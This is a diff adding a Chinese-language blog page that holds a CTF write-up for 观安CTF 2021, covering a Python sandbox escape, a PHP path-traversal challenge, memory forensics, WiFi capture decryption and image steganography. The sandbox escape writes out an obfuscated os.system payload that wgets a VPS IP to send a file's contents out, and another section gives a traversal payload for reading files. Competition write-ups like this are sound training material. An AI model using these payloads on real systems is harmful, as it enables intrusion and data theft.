@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>观安CTF 2021 WriteUp :: Ca1s1&#39;Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="WEB Baby Calc 通过测试发现该环境为python3沙盒逃逸 通过网上公开的POC发现存在代码执行，但是无法回显 尝试反弹SHELL均失败 发现系统不存在curl命令，但存在wget通过wget命令携带回显带出到vps
+如下图使用wget，把命令包含在``中在使用base64带到vps中 expr=__import__(&#34;os&#34;).__getattribute__(&#34;metsys&#34;[::-1])(&#34;wget%20http://49.234.223.23:1234/1.txt?data=`cat%20/flag_is_here|grep%20flag|base64`&#34;) vps监听： Baby WEB 题目提供了源代码，查看incloud.php文件，发现57行存在file_put_contents函数，且password未做限制。通过构造poc使password造成任意文件读取漏洞
+POC:1|../../../../../../../../flag|
+注册任意用户名，密码为POC，登陆密码为1。 登陆后返回flag Misc 老电脑的内存 经典的内存取证题目，通过imageinfo来获取该内存镜像的摘要信息 查看缓存在内存中的注册表： 获取 SAM 表中的用户： 查看内存中系统的密码： CMD5解密 通过filescan查找ctf用户下的文件 发现1.png
+volatility -f Windows\ 7-c0e05742.vmem --profile=Win7SP1x86_23418 filescan | grep ctf 将1.png dump下来，查看文件。与密码结合获得flag ##被加密的wifi 通过分析数据包发现key为88888888 通过airdecap-ng命令输入密码解密数据包 在已解密的数据包中找到flag release 拿到一张图片，首先使用binwalk分离文件，没有发现有用信息 通过winhex修改文件高度 得到一半flag 翻到文件底部发现很多20和09，想到通过二进制生成二维码，将20修改为0，09改为1 使用脚本转换为图片，得到二维码 扫描得到flag
+" />
+<meta name="keywords" content="ctf, 观安" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://vuln.top/posts/guanan2021wp/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://vuln.top/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="观安CTF 2021 WriteUp">
+<meta property="og:description" content="WEB Baby Calc 通过测试发现该环境为python3沙盒逃逸 通过网上公开的POC发现存在代码执行，但是无法回显 尝试反弹SHELL均失败 发现系统不存在curl命令，但存在wget通过wget命令携带回显带出到vps
+如下图使用wget，把命令包含在``中在使用base64带到vps中 expr=__import__(&#34;os&#34;).__getattribute__(&#34;metsys&#34;[::-1])(&#34;wget%20http://49.234.223.23:1234/1.txt?data=`cat%20/flag_is_here|grep%20flag|base64`&#34;) vps监听： Baby WEB 题目提供了源代码，查看incloud.php文件，发现57行存在file_put_contents函数，且password未做限制。通过构造poc使password造成任意文件读取漏洞
+POC:1|../../../../../../../../flag|
+注册任意用户名，密码为POC，登陆密码为1。 登陆后返回flag Misc 老电脑的内存 经典的内存取证题目，通过imageinfo来获取该内存镜像的摘要信息 查看缓存在内存中的注册表： 获取 SAM 表中的用户： 查看内存中系统的密码： CMD5解密 通过filescan查找ctf用户下的文件 发现1.png
+volatility -f Windows\ 7-c0e05742.vmem --profile=Win7SP1x86_23418 filescan | grep ctf 将1.png dump下来，查看文件。与密码结合获得flag ##被加密的wifi 通过分析数据包发现key为88888888 通过airdecap-ng命令输入密码解密数据包 在已解密的数据包中找到flag release 拿到一张图片，首先使用binwalk分离文件，没有发现有用信息 通过winhex修改文件高度 得到一半flag 翻到文件底部发现很多20和09，想到通过二进制生成二维码，将20修改为0，09改为1 使用脚本转换为图片，得到二维码 扫描得到flag
+" />
+<meta property="og:url" content="https://vuln.top/posts/guanan2021wp/" />
+<meta property="og:site_name" content="Ca1s1&#39;Blog" />
+
+  
+  
+  <meta property="og:image" content="https://vuln.top/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2021-09-05 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://vuln.top/">
+  <div class="logo">
+    Ca1s1'Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/">about</a></li>
+        
+      
+        
+          <li><a href="/link/">link</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/" >about</a></li>
+        
+      
+        
+          <li><a href="/link/" >link</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://vuln.top/posts/guanan2021wp/">观安CTF 2021 WriteUp</a>
+  </h1>
+  <div class="post-meta">
+    
+      <time class="post-date">
+        2021-09-05 ::
+        
+      </time>
+    
+    
+      <span class="post-author">Ca1s1</span>
+    
+    
+      <span class="post-reading-time">:: 1 min read (49 words)</span>
+    
+  </div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="web">WEB<a href="#web" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="baby-calc">Baby Calc<a href="#baby-calc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>通过测试发现该环境为python3沙盒逃逸
+通过网上公开的POC发现存在代码执行，但是无法回显
+尝试反弹SHELL均失败
+发现系统不存在curl命令，但存在wget通过wget命令携带回显带出到vps</p>
+</blockquote>
+<p>如下图使用wget，把命令包含在``中在使用base64带到vps中
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/1.png" alt="1"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>expr<span style="color:#f92672">=</span>__import__(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>__getattribute__(<span style="color:#e6db74">&#34;metsys&#34;</span>[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])(<span style="color:#e6db74">&#34;wget%20http://49.234.223.23:1234/1.txt?data=`cat%20/flag_is_here|grep</span><span style="color:#e6db74">%20f</span><span style="color:#e6db74">lag|base64`&#34;</span>)
+</span></span></code></pre></div><p>vps监听：
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/2.png" alt="2"></p>
+<h2 id="baby-web">Baby WEB<a href="#baby-web" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>题目提供了源代码，查看incloud.php文件，发现57行存在file_put_contents函数，且password未做限制。通过构造poc使password造成任意文件读取漏洞</p>
+</blockquote>
+<p><img src="https://h1dery.github.io/2021/09/05/16308495601985/16308507210959.jpg" alt="-w1134">
+POC:<code>1|../../../../../../../../flag|</code></p>
+<pre tabindex="0"><code>注册任意用户名，密码为POC，登陆密码为1。
+登陆后返回flag
+</code></pre><p><img src="https://h1dery.github.io/2021/09/05/16308495601985/16308507640380.jpg" alt="-w552"></p>
+<h1 id="misc">Misc<a href="#misc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="老电脑的内存">老电脑的内存<a href="#老电脑的内存" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>经典的内存取证题目，通过imageinfo来获取该内存镜像的摘要信息
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308508816927.jpg" alt="-w966">
+查看缓存在内存中的注册表：
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308508960121.jpg" alt="-w996">
+获取 SAM 表中的用户：
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509103690.jpg" alt="-w1005">
+查看内存中系统的密码：
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509224912.jpg" alt="-w969">
+CMD5解密
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509294061.jpg" alt="-w909">
+通过filescan查找ctf用户下的文件 发现1.png</p>
+<pre tabindex="0"><code>volatility -f Windows\ 7-c0e05742.vmem --profile=Win7SP1x86_23418 filescan | grep ctf
+</code></pre><p><img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509546496.jpg" alt="-w1002">
+将1.png dump下来，查看文件。与密码结合获得flag
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509648154.jpg" alt="-w915">
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308509739729.jpg" alt="-w997">
+##被加密的wifi
+通过分析数据包发现key为88888888
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308510039551.jpg" alt="-w528">
+通过airdecap-ng命令输入密码解密数据包
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308510142741.jpg" alt="-w695">
+在已解密的数据包中找到flag
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308510348552.jpg" alt="-w974"></p>
+<h2 id="release">release<a href="#release" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>拿到一张图片，首先使用<code>binwalk</code>分离文件，没有发现有用信息
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308511070136.jpg" alt="-w696">
+通过winhex修改文件高度
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308511475227.jpg" alt="-w813">
+得到一半flag
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308511600485.jpg" alt="-w805">
+翻到文件底部发现很多20和09，想到通过二进制生成二维码，将20修改为0，09改为1
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308512337387.jpg" alt="-w854">
+使用脚本转换为图片，得到二维码
+<img src="https://h1dery.github.io/2021/09/05/16308495601985/16308512567725.jpg" alt="-w826">
+扫描得到flag</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h"></span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://vuln.top/posts/thinkphp3.1.3_sql_bypass/">
+                <span class="button__icon">←</span>
+                <span class="button__text">thinkphp3.1.3 sql注入 bypass</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://vuln.top/posts/hufuctfweb/">
+                <span class="button__text">2021年虎符线下赛WEB</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
